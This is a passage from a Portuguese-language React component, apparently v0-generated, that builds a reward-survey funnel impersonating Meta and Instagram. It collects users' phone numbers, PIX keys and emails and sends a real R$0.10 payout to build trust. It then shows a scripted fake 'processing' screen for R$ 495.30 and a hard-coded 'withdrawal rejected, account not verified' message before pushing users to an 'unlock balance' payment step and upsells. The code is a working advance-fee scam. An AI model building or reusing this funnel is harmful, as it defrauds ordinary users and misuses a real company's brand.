        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(paymentData.pixKey)) {
          pixKeyType = "email"
          setSelectedPixKeyType("email")
        } else if (/^\d{11}$/.test(paymentData.pixKey.replace(/\D/g, ""))) {
          const digits = paymentData.pixKey.replace(/\D/g, "")
          if (digits.length === 11 && digits.startsWith("11")) {
            pixKeyType = "phone"
            setSelectedPixKeyType("phone")
          } else if (digits.length === 11) {
            pixKeyType = "cpf"
            setSelectedPixKeyType("cpf")
          }
        }
      }

      if (!pixKeyType) {
        alert("Não foi possível identificar o tipo da chave PIX. Verifique se está no formato correto.")
        setPixValidationLoading(false)
        setShowPixValidationModal(false)
        setShowConfirmationModal(true)
        return
      }

      // Validar chave PIX
      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, pixKeyType)) {
        alert("Chave PIX inválida para o tipo selecionado")
        setPixValidationLoading(false)
        setShowPixValidationModal(false)
        setShowConfirmationModal(true)
        return
      }

      const cashoutData = {
        amount: 0.1, // R$ 0,10 conforme especificado
        external_id: KeyClubAPI.generateExternalId(),
        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, pixKeyType),
        key_type: pixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
        description: `Saque Meta Research - ${fullName}`,
      }

      console.log("[v0] Enviando R$0,10 via KeyClub:", cashoutData)

      const result = await KeyClubAPI.createCashout(cashoutData)

      if (result.success) {
        console.log("[v0] Cashout realizado com sucesso:", result.data)
        // Parar o loading após sucesso
        setPixValidationLoading(false)
      } else {
        console.error("[v0] Erro no cashout:", result.error)
        alert(`Erro ao processar saque: ${result.error}`)
        setPixValidationLoading(false)
        setShowPixValidationModal(false)
      }
    } catch (error) {
      console.error("[v0] Erro interno no cashout:", error)
      alert("Erro interno. Tente novamente.")
      setPixValidationLoading(false)
      setShowPixValidationModal(false)
    }
  }

  const handleProcessingComplete = () => {
    setShowProcessingModal(false)
    setShowRejectionModal(true)

    // Countdown para redirecionamento
    const countdownInterval = setInterval(() => {
      setRejectionCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownInterval)
          setShowRejectionModal(false)
          setShowPaymentForm(false)
          setShowUnlockBalance(true)
          return 5
        }
        return prev - 1
      })
    }, 1000)
  }

  const handlePixValidationConfirm = () => {
    setShowPixValidationModal(false)
    markPixKeyAsUsed(paymentData.pixKey)

    // Prosseguir para próxima etapa do fluxo
    setShowProcessingModal(true)
    setProcessingText("Processando seu saque...")
    setProcessingProgress(0)

    let progress = 0
    const progressInterval = setInterval(() => {
      progress += 100 / 90 // 90 intervalos de 100ms para completar 9 segundos
      setProcessingProgress(Math.min(progress, 100))

      if (progress >= 100) {
        clearInterval(progressInterval)
        setTimeout(() => {
          handleProcessingComplete()
        }, 0) // Completa imediatamente após atingir 100%
      }
    }, 100) // Atualiza a cada 100ms

    setProcessingTimer(progressInterval)
  }

  useEffect(() => {
    return () => {
      if (processingTimer) {
        clearInterval(processingTimer)
      }
    }
  }, [processingTimer])

  const handleEditData = () => {
    setShowConfirmationModal(false)
  }

  const handleInputChange = (field: string, value: string) => {
    if (field === "phone") {
      setPaymentData((prev) => ({
        ...prev,
        [field]: value,
      }))
    } else if (field === "pixKey" && selectedPixKeyType === "cpf") {
      // Remove todos os caracteres não numéricos
      const numbersOnly = value.replace(/\D/g, "")

      // Limita a 11 dígitos
      const limitedNumbers = numbersOnly.slice(0, 11)

      // Aplica a formatação de CPF XXX.XXX.XXX-XX
      let formattedCPF = limitedNumbers
      if (limitedNumbers.length >= 3) {
        formattedCPF = limitedNumbers.slice(0, 3)
        if (limitedNumbers.length > 3) {
          formattedCPF += `.${limitedNumbers.slice(3, 6)}`
          if (limitedNumbers.length > 6) {
            formattedCPF += `.${limitedNumbers.slice(6, 9)}`
            if (limitedNumbers.length > 9) {
              formattedCPF += `-${limitedNumbers.slice(9, 11)}`
            }
          }
        }
      }

      setPaymentData((prev) => ({
        ...prev,
        [field]: formattedCPF,
      }))
    } else if (field === "pixKey" && selectedPixKeyType === "phone") {
      setPaymentData((prev) => ({
        ...prev,
        [field]: value,
      }))
    } else if (field === "pixKey" && selectedPixKeyType === "email") {
      setPaymentData((prev) => ({
        ...prev,
        [field]: value,
      }))
    } else {
      setPaymentData((prev) => ({
        ...prev,
        [field]: value,
      }))
    }
  }

  const handleUnlockContinue = () => {
    // </CHANGE> Redirect to /withdraw with UTM parameters instead of continuing internal funnel
    navigateWithUTM("/withdraw")
  }

  useEffect(() => {
    if (showUnlockBalance) {
      const timer = setTimeout(() => {
        setShowUnlockAnimation(true)
      }, 500)
      return () => clearTimeout(timer)
    }
  }, [showUnlockBalance])

  const getFirstName = (fullName: string) => {
    const firstName = fullName.split(" ")[0] || ""
    return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()
  }

  const handleSupportClick = () => {
    setSupportIsTyping(true)
    setShowSupportTooltip(false)
  }

  useEffect(() => {
    if (showPixStep && pixLoadingComplete && timeLeft > 0) {
      const timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1)
      }, 1000)

      return () => clearInterval(timer)
    }
  }, [showPixStep, pixLoadingComplete, timeLeft])

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60)
    const remainingSeconds = seconds % 60
    return `${minutes}:${remainingSeconds.toString().padStart(2, "0")}`
  }

  const handleVideoTutorialContinue = () => {
    setShowVideoTutorial(false)
    createPixPayment()
  }

  const handleKeyclubCashout = async () => {
    try {
      console.log("[v0] Iniciando cashout KeyClub")

      // Validar dados do pagamento
      if (!paymentData.pixKey || !selectedPixKeyType) {
        alert("Por favor, preencha todos os dados PIX")
        return
      }

      // Validar chave PIX
      if (!KeyClubAPI.validatePixKey(paymentData.pixKey, selectedPixKeyType)) {
        alert("Chave PIX inválida para o tipo selecionado")
        return
      }

      const cashoutData = {
        amount: 0.1, // R$ 0,10 conforme especificado
        external_id: fullName || paymentData.fullName || `user_${Date.now()}`,
        pix_key: KeyClubAPI.formatPixKey(paymentData.pixKey, selectedPixKeyType),
        key_type: selectedPixKeyType.toUpperCase() as "EMAIL" | "CPF" | "CNPJ" | "PHONE",
        description: `Saque Meta Research - ${fullName}`,
      }

      console.log("[v0] Dados do cashout:", cashoutData)

      const result = await KeyClubAPI.createCashout(cashoutData)

      if (result.success) {
        console.log("[v0] Cashout realizado com sucesso:", result.data)
        alert("Saque de R$ 0,10 processado com sucesso! O valor será creditado em sua conta em breve.")

        // Fechar modais e resetar estado
        setShowPixValidationModal(false)
        setShowPaymentForm(false)

        // Opcional: redirecionar ou mostrar tela de sucesso
        setShowProcessingModal(true)
        setProcessingText("Processando seu saque...")
      } else {
        console.error("[v0] Erro no cashout:", result.error)

        let errorMessage = result.error || "Erro desconhecido"

        if (result.error?.includes("IP não autorizado")) {
          errorMessage =
            "Erro de autorização: O servidor não está autorizado na KeyClub. Entre em contato com o suporte."
        } else if (result.error?.includes("403")) {
          errorMessage = "Acesso negado: Verifique suas credenciais ou entre em contato com o suporte."
        } else if (result.error?.includes("500")) {
          errorMessage = "Erro interno do servidor: Tente novamente em alguns minutos."
        } else if (result.error?.includes("400")) {
          errorMessage = "Dados inválidos: Verifique as informações fornecidas."
        }

        alert(`Erro ao processar saque: ${errorMessage}`)
      }
    } catch (error) {
      console.error("[v0] Erro interno no cashout:", error)
      alert("Erro interno. Tente novamente em alguns minutos.")
    }
  }

  if (isSubmitted) {
    return (
      <div className="min-h-screen flex flex-col px-4 bg-white relative py-0">
        {/* Balance Display */}
        <div className="fixed top-4 right-4 z-10">
          <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
                clipRule="evenodd"
              />
            </svg>
            R$ {balance.toFixed(2)}
          </div>
        </div>

        <div className="fixed top-4 left-4 z-10">
          <Image src="/images/meta-logo.png" alt="Meta Logo" width={100} height={50} className="object-contain" />
        </div>

        {showPaymentForm && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
            style={{
              backgroundImage: "url(/images/background-form.png)",
              backgroundSize: "cover",
              backgroundPosition: "center",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <div className="text-center mb-6">
                <h3 className="text-lg font-semibold text-gray-800 mb-2">{t.paymentData}</h3>
                <p className="text-gray-600 mb-4">Preencha seus dados para receber o pagamento</p>
              </div>

              <form onSubmit={handlePaymentSubmit} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Telefone</label>
                  <Input
                    type="tel"
                    placeholder="(11) 99999-9999"
                    value={paymentData.phone}
                    onChange={(e) => setPaymentData((prev) => ({ ...prev, phone: e.target.value }))}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Chave PIX</label>
                  <Input
                    type="text"
                    placeholder="Digite sua chave PIX"
                    value={paymentData.pixKey}
                    onChange={(e) => setPaymentData((prev) => ({ ...prev, pixKey: e.target.value }))}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
                  <Input
                    type="email"
                    placeholder="seu@email.com"
                    value={paymentData.email}
                    onChange={(e) => setPaymentData((prev) => ({ ...prev, email: e.target.value }))}
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent"
                  />
                </div>

                <div className="space-y-3 mt-6">
                  <Button
                    type="submit"
                    className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide"
                  >
                    Confirmar Dados
                  </Button>
                  <Button
                    type="button"
                    onClick={() => setShowPaymentForm(false)}
                    variant="outline"
                    className="w-full py-3 text-sm border-gray-300 text-gray-600 hover:text-gray-800 bg-transparent"
                  >
                    Voltar
                  </Button>
                </div>
              </form>
            </div>
          </div>
        )}

        {showQuestion5Popup && (
          <div className="fixed inset-0 backdrop-blur-sm flex items-center justify-center z-50 px-4 bg-white bg-white">
            <div className="bg-white rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <div className="text-center">
                <h3 className="text-xl font-bold text-gray-800 mb-4">Excelente, {getFirstName(fullName)}! ✅</h3>
                <p className="text-gray-700 mb-4 leading-relaxed">
                  Você está avançando muito bem e suas respostas estão ajudando a deixar a plataforma mais segura e
                  confiável.
                </p>
                <p className="text-gray-700 mb-6 leading-relaxed">
                  Continue firme: faltam poucas perguntas, ao concluir este questionário exclusivo, sua recompensa será
                  liberada imediatamente para você.
                </p>
                <button
                  onClick={handleQuestion5Continue}
                  className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 text-white font-semibold py-3 px-6 rounded-lg hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 transition-all duration-300 transform hover:scale-105 shadow-lg"
                >
                  Continuar Respondendo
                </button>
              </div>
            </div>
          </div>
        )}

        {showRewardModal && (
          <div className="fixed inset-0 bg-opacity-20 flex items-center justify-center z-50 px-4 bg-white">
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl">
              <div className="text-center">
                <h3 className="text-lg font-semibold text-gray-800 mb-2">{t.congratulations}</h3>
                <p className="text-gray-600 mb-4">{t.youEarned}</p>
                <div className="text-3xl font-bold text-green-600 mb-4">
                  R$ {questions[currentQuestion]?.reward.toFixed(2)}
                </div>
                <div className="flex justify-center mb-4">
                  <img src="/images/coin-reward.gif" alt="Moeda de recompensa" className="w-16 h-13" />
                </div>
                <p className="text-sm text-gray-500 mb-2">{t.addedToBalance}</p>
              </div>
            </div>
          </div>
        )}

        {showConfirmationModal && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
            style={{
              backgroundImage: "url(/images/background-form.png)",
              backgroundSize: "cover",
              backgroundPosition: "center",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <div className="text-center mb-6">
                <h3 className="text-lg font-semibold text-gray-800 mb-2">{t.confirmDataTitle}</h3>
                <p className="text-gray-600 mb-4">{t.confirmDataQuestion}</p>
              </div>

              <div className="bg-gray-50 rounded-lg p-4 mb-6 space-y-3">
                <div>
                  <span className="text-sm font-medium text-gray-700">{t.fullName}</span>
                  <p className="text-gray-900">{fullName}</p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-700">{t.phone}</span>
                  <p className="text-gray-900">{paymentData.phone}</p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-700">{t.pixKey}</span>
                  <p className="text-gray-900">{paymentData.pixKey}</p>
                </div>
                <div>
                  <span className="text-sm font-medium text-gray-700">Email:</span>
                  <p className="text-gray-900">{paymentData.email}</p>
                </div>
              </div>

              <div className="space-y-3">
                <Button
                  onClick={handleConfirmPayment}
                  className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide"
                >
                  {t.yesConfirm}
                </Button>
                <Button
                  onClick={handleEditData}
                  variant="outline"
                  className="w-full py-3 text-sm border-gray-300 text-gray-600 hover:text-gray-800 bg-transparent border-none"
                >
                  {t.noWantChange}
                </Button>
              </div>
            </div>
          </div>
        )}

        {showProcessingModal && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
            style={{
              backgroundImage: "url(/images/background-form.png)",
              backgroundSize: "cover",
              backgroundPosition: "center",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <div className="text-center">
                {!showProcessingError ? (
                  <>
                    <h3 className="text-lg font-semibold text-gray-800 mb-2">{processingText}</h3>

                    <div className="w-full bg-gray-200 h-3 rounded-full mb-2">
                      <div
                        className="bg-gradient-to-r from-purple-500 to-orange-400 h-3 rounded-full transition-all duration-100 ease-out"
                        style={{ width: `${processingProgress}%` }}
                      ></div>
                    </div>

                    <p className="text-sm text-gray-600 mb-6">{Math.round(processingProgress)}%</p>

                    <div className="bg-gray-50 rounded-lg p-4 text-left">
                      <h4 className="text-sm font-semibold text-gray-800 mb-3 text-center">Detalhes da Transação</h4>
                      <div className="space-y-2">
                        <div className="flex justify-between items-center">
                          <span className="text-sm text-gray-600">Valor:</span>
                          <span className="text-sm font-medium text-gray-800">R$ 495.30</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-sm text-gray-600">Chave Pix:</span>
                          <span className="text-sm font-medium text-gray-800">{paymentData.pixKey}</span>
                        </div>
                        <div className="flex justify-between items-center">
                          <span className="text-sm text-gray-600">ID da Transação:</span>
                          <span className="text-sm font-medium text-gray-800">PIX291832</span>
                        </div>
                      </div>
                    </div>

                    <div className="space-y-3 mt-4">
                      <div className="flex items-start gap-2">
                        <span className="text-green-600 text-sm">☑️</span>
                        <p className="text-xs text-gray-600 leading-relaxed">
                          O processamento pode levar até 2 minutos. Por favor, aguarde enquanto confirmamos sua
                          transação.
                        </p>
                      </div>
                      <div className="flex items-start gap-2">
                        <span className="text-yellow-600 text-sm">⚠️</span>
                        <p className="text-xs text-gray-600 leading-relaxed">
                          Não atualize ou feche esta página durante o processamento para evitar erros na transação.
                        </p>
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <h3 className="text-lg font-semibold text-red-600 mb-2">Saque rejeitado</h3>
                    <p className="text-gray-700 mb-4">Conta ainda não foi verificada</p>
                    <p className="text-sm text-gray-600">
                      Você será redirecionado em <span className="font-bold">{redirectCountdown}</span>{" "}
                      <span className="font-bold">segundos</span>...
                    </p>
                  </>
                )}
              </div>
            </div>
          </div>
        )}

        {showPixValidationModal && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
            style={{
              backgroundImage: "url(/images/background-form.png)",
              backgroundSize: "cover",
              backgroundPosition: "center",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <div className="text-center mb-6">
                <h3 className="text-lg font-semibold text-gray-800 mb-4">Validação da Chave PIX</h3>

                {pixValidationLoading ? (
                  <div className="space-y-4">
                    <div className="flex justify-center">
                      <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-pink-500"></div>
                    </div>
                    <p className="text-gray-600">Enviando R$0,10 centavos para validar sua chave PIX...</p>
                  </div>
                ) : (
                  <div className="space-y-4">
                    <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                      <div className="flex items-center justify-center mb-2">
                        <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                          <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                          </svg>
                        </div>
                      </div>
                      <p className="text-green-800 font-medium text-sm">
                        Enviamos R$0,10 centavos para a chave PIX cadastrada:
                      </p>
                      <p className="text-green-700 text-sm mt-1 font-mono bg-green-100 p-2 rounded">
                        {paymentData.pixKey}
                      </p>
                    </div>

                    <p className="text-gray-600 text-sm">
                      Verifique se recebeu o valor em sua conta para confirmar que a chave PIX está correta.
                    </p>

                    <Button
                      onClick={handlePixValidationConfirm}
                      className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide"
                    >
                      SIM, CONFIRMAR
                    </Button>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {showRejectionModal && (
          <div
            className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50 px-4 animate-in fade-in duration-300"
            style={{
              backgroundImage: "url(/images/background-form.png)",
              backgroundSize: "cover",
              backgroundPosition: "center",
              backgroundRepeat: "no-repeat",
            }}
          >
            <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 shadow-2xl animate-in zoom-in-95 fade-in duration-300 ease-out">
              <h3 className="text-lg font-bold text-red-600 mb-2">Saque rejeitado</h3>
              <p className="text-gray-600 mb-4">Conta ainda não foi verificada</p>
              <p className="text-sm text-gray-500">
                Você será redirecionado em <span className="font-bold">{rejectionCountdown} segundos</span>
              </p>
            </div>
          </div>
        )}

        {showVideoTutorial && (
          <div className="flex flex-col min-h-screen">
            <div className="flex-1 flex items-center justify-center my-0">
              <Card className="w-full max-w-md mx-auto bg-white rounded-lg shadow-none mb-0 mt-0">
                <CardHeader className="text-center pb-4">
                  <CardTitle className="text-lg font-bold text-gray-800 mb-2 uppercase tracking-wide">
                    DESBLOQUEIO DE SALDO
                  </CardTitle>
                  <p className="text-sm text-gray-600">Cauã, veja como liberar seu saque assistindo ao vídeo</p>
                </CardHeader>
                <CardContent className="px-6 pb-6">
                  <div className="text-center space-y-6">
                    <div className="relative bg-gradient-to-br from-purple-500 to-pink-500 rounded-lg p-8 mb-4">
                      <div className="text-center">
                        <div className="w-16 h-16 bg-white rounded-full flex items-center justify-center mx-auto mb-4">
                          <svg className="w-8 h-8 text-purple-500" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M8 5v14l11-7z" />
                          </svg>
                        </div>
                        <button
                          onClick={handleVideoTutorialContinue}
                          className="text-white font-semibold text-lg mb-2 block w-full"
                        >
                          Clique aqui
                        </button>
                        <p className="text-white text-sm">para ativar o som</p>
                      </div>
                    </div>
                    <p className="text-xs text-gray-500 text-center">
                      Todos os direitos reservados © 2025 Instagram from Meta
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        )}

        {showUnlockBalance ? (
          <div className="flex flex-col min-h-screen">
            <div className="flex-1 flex items-center justify-center my-0">
              <Card className="w-full max-w-md mx-auto bg-white rounded-lg shadow-none mb-0 mt-0">
                <CardHeader className="text-center pb-0">
                  <CardTitle className="text-lg font-bold text-gray-800 mb-1 uppercase tracking-wide">
                    {t.unlockBalance}
                  </CardTitle>
                  <div className="flex justify-center mb-3">
                    <div className="relative flex items-center justify-center w-20 my-0 h-8">
                      <Image
                        src="/images/unlock-animation-new.gif"
                        alt="Desbloqueando saldo"
                        width={128}
                        height={128}
                        className="object-contain"
                        unoptimized
                      />
                    </div>
                  </div>
                  <div className="bg-gray-50 rounded-lg p-3 mb-3 border border-gray-200">
                    <h3 className="text-xs font-semibold text-gray-800 mb-2 text-center">Informações da Conta</h3>
                    <div className="space-y-1 text-xs">
                      <div className="flex justify-between">
                        <span className="text-gray-600">Nome:</span>
                        <span className="text-gray-800 font-medium">{fullName || "Não informado"}</span>
                      </div>
                      <div className="flex justify-between"></div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Chave PIX:</span>
                        <span className="text-gray-800 font-medium">{paymentData.pixKey || "Não informado"}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-600">Valor:</span>
                        <span className="text-gray-800 font-medium">R$ 495.30</span>
                      </div>
                    </div>
                  </div>
                </CardHeader>
                <CardContent className="px-6 pb-4">
                  <div className="text-center space-y-2">
                    <p className="text-gray-700 leading-relaxed text-sm">{t.antiFraudText}</p>
                    <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                      <p className="text-gray-700 text-xs leading-relaxed">{t.validationText}</p>
                    </div>
                    <div className="mt-3">
                      <Button
                        onClick={handleUnlockContinue}
                        className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-3 rounded-lg text-sm uppercase tracking-wide shadow-xl"
                      >
                        {t.continue}
                      </Button>
                    </div>
                    <div className="text-center mt-3 pt-2 border-t border-gray-100">
                      <p className="text-xs text-gray-500">{t.footerText}</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        ) : showVideoUnlock ? (
          <div className="flex flex-col min-h-screen">
            <div className="flex-1 flex items-center justify-center">
              <Card className="w-full max-w-md mx-auto bg-white rounded-lg mt-0 mb-0 shadow-xl">
                <CardHeader className="text-center pb-4">
                  <CardTitle className="text-xl font-bold text-gray-800 mb-2 uppercase tracking-wide">
                    {t.videoUnlockTitle}
                  </CardTitle>
                  <p className="text-gray-700 leading-relaxed px-4">
                    {t.getPersonalizedVideoText(getFirstName(paymentData.fullName))}
                  </p>
                </CardHeader>

                <CardContent className="px-6 pb-6">
                  <div className="text-center space-y-6">
                    {/* Substituindo player simples por player customizado estilo VSL */}
                    <div className="relative w-full bg-black rounded-lg overflow-hidden">
                      <div id="vsl-container" className="relative max-w-full h-auto">
                        <div className="video-wrapper relative w-full" style={{ paddingTop: "56.25%" }}>
                          <div className="player-wrapper absolute top-0 left-0 w-full h-full">
                            <video
                              ref={videoRef}
                              className="absolute top-0 left-0 w-full h-full object-contain"
                              muted
                              autoPlay
                              playsInline
                              onTimeUpdate={() => {
                                if (videoRef.current) {
                                  const percent = (videoRef.current.currentTime / videoRef.current.duration) * 100
                                  const progressBar = document.getElementById("progressBar")
                                  if (progressBar) {
                                    progressBar.style.width = percent + "%"
                                  }
                                }
                              }}
                              onEnded={() => {
                                // O botão deve aparecer apenas após 30 segundos conforme o useEffect
                              }}
                            >
                              <source src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/test%20final%20%281%29%20%281%29-xvVuYkg7gdypenbFvRV4RBqakIT8XZ.mp4" type="video/mp4" />
                              <p>Your browser does not support the video tag.</p>
                            </video>

                            <div
                              className="absolute top-0 left-0 w-full h-full z-10 cursor-pointer"
                              onClick={() => {
                                if (!videoRef.current) return

                                // Se o overlay ainda está visível, esconde ele e desmuta
                                if (isVideoMuted) {
                                  videoRef.current.currentTime = 0
                                  videoRef.current.muted = false
                                  videoRef.current.play()
                                  setIsVideoMuted(false)
                                } else {
                                  // Alterna entre pause/play
                                  if (videoRef.current.paused) {
                                    videoRef.current.play()
                                    setIsVideoPaused(false)
                                    setShowPauseOverlay(false)
                                  } else {
                                    videoRef.current.pause()
                                    setIsVideoPaused(true)
                                    setShowPauseOverlay(true)
                                    console.log("[v0] Vídeo pausado")
                                  }
                                }
                              }}
                              onContextMenu={(e) => e.preventDefault()}
                            />
                          </div>

                          {/* Audio Overlay */}
                          {isVideoMuted && (
                            <div className="overlay-audio absolute top-0 left-0 w-full h-full flex justify-center items-center text-center z-20 bg-transparent p-4 pointer-events-none">
                              <div className="audio-content bg-[rgba(184,73,246,1)] p-5 border-2 border-white rounded-xl shadow-2xl flex flex-col items-center max-w-[280px] w-[90%] animate-fade-in opacity-95">
                                <p className="text-white font-bold text-lg mb-2">Clique aqui</p>
                                <div className="icon-container flex justify-center items-center my-2">
                                  <div className="w-[70px] h-[70px] bg-white bg-opacity-20 rounded-full flex items-center justify-center">
                                    <svg
                                      className="w-8 h-8 text-[rgba(184,73,246,1)]"
                                      fill="currentColor"
                                      viewBox="0 0 24 24"
                                    >
                                      <path d="M8 5v14l11-7z" />
                                    </svg>
                                  </div>
                                </div>
                                <p className="text-white font-bold text-lg">para ativar o som</p>
                              </div>
                            </div>
                          )}

                          {/* Pause Overlay - REMOVIDO para mostrar o frame pausado
                          {showPauseOverlay && (
                            <div className="overlay-pause absolute top-0 left-0 w-full h-full flex justify-center items-center z-20 bg-black bg-opacity-50 pointer-events-none">
                              <div className="bg-white bg-opacity-20 rounded-full p-4">
                                <svg className="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24">
                                  <path d="M8 5v14l11-7z" />
                                </svg>
                              </div>
                            </div>
                          )}
                          */}

                          {/* Progress Bar */}
                          <div
                            id="progressBar"
                            className="absolute bottom-0 left-0 h-1.5 bg-[rgba(184,73,246,1)] z-10 transition-all duration-200"
                            style={{ width: "0%" }}
                          />
                        </div>
                      </div>
                    </div>

                    <div className="mt-6">
                      {showUnlockButton && (
                        <Button
                          onClick={createPixPayment}
                          disabled={isCreatingPixPayment}
                          className="w-full bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 hover:from-pink-600 hover:via-purple-600 hover:to-orange-500 text-white font-semibold py-4 rounded-lg text-base uppercase tracking-wide shadow-xl disabled:opacity-50"
                        >
                          {isCreatingPixPayment ? "PROCESSANDO..." : t.unlockWithdrawal}
                        </Button>
                      )}
                    </div>
                    <div className="text-center mt-6 pt-4 border-t border-gray-100">
                      <p className="text-xs text-gray-500">{t.footerText}</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          </div>
        ) : showUpsell ? (
          <div className="min-h-screen bg-white flex flex-col">
            <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
              <div className="text-center w-full max-w-2xl space-y-6">
                <div className="mx-auto w-20 h-20 flex items-center justify-center mb-4">
                  <Image
                    src="/images/instagram-logo-official.png"
                    alt="Instagram Logo"
                    width={80}
                    height={80}
                    className="object-contain"
                  />
                </div>

                <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
                  <div className="flex items-center justify-center space-x-2 mb-2">
                    <svg className="w-6 h-6 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                        clipRule="evenodd"
                      />
                    </svg>
                    <h2 className="text-lg font-bold text-green-700">Pagamento Confirmado!</h2>
                  </div>
                  <p className="text-sm text-green-600">
                    Seu pagamento foi processado com sucesso. Agora você tem acesso exclusivo a estas ofertas especiais:
                  </p>
                </div>

                <div className="space-y-4">
                  {upsellProducts.map((product) => (
                    <Card
                      key={product.id}
                      className="border-2 border-purple-200 hover:border-purple-400 transition-colors"
                    >
                      <CardContent className="p-6">
                        <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
                          <div className="flex-1 text-left">
                            <h3 className="text-lg font-bold text-gray-800 mb-2">{product.title}</h3>
                            <p className="text-sm text-gray-600 mb-3">{product.description}</p>
                            <ul className="text-xs text-gray-500 space-y-1">
                              {product.features.map((feature, index) => (
                                <li key={index} className="flex items-center space-x-2">
                                  <svg className="w-3 h-3 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                                    <path
                                      fillRule="evenodd"
                                      d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                                      clipRule="evenodd"
                                    />
                                  </svg>
                                  <span>{feature}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
